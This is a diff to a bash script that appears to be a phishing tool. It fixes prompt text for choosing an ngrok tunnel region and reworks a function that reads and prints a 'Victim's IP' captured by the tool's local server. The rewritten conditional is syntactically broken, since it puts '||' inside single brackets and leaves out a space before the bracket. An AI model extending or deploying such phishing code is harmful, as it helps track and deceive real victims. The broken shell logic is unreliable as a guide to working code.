@@ -296,8 +296,8 @@ ngrok_token_setup(){
 	start_ngrok
 }
 ngrok_region() {
-        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter prefered region (Deafult=us) : "
-	read -p "${GREEN} (Example: us eu au ap sa jp in) : " ngrokregion
+        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter prefered region (Default=us) : "
+	read -p "${GREEN}   (Example: us eu au ap sa jp in) : " ngrokregion
 	case $ngrokregion in
 	"us" | "US")
 		ngrokregion="us";;
@@ -683,15 +683,11 @@ displayshortlink() {
 }
 ## Get IP address
 capture_ip() {
-        IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
+##        IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
+				IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
         IFS=$'\n'
         echo -e "\n${RED} Victim's IP : ${RED}$IP"
-	if [ reply_tunnel=1 ]; then
-		echo -ne "${RED} IP details cannot be captured in localhost server"
-		echo " "
-		save_ip
-		rm -rf .server/www/ip.txt
-	elif [ reply_tunnel=01 ]; then
+	if [ $reply_tunnel -eq 1 || $reply_tunnel -eq 01]; then
 		echo -ne "${RED} IP details cannot be captured in localhost server"
 		echo " "
 		save_ip
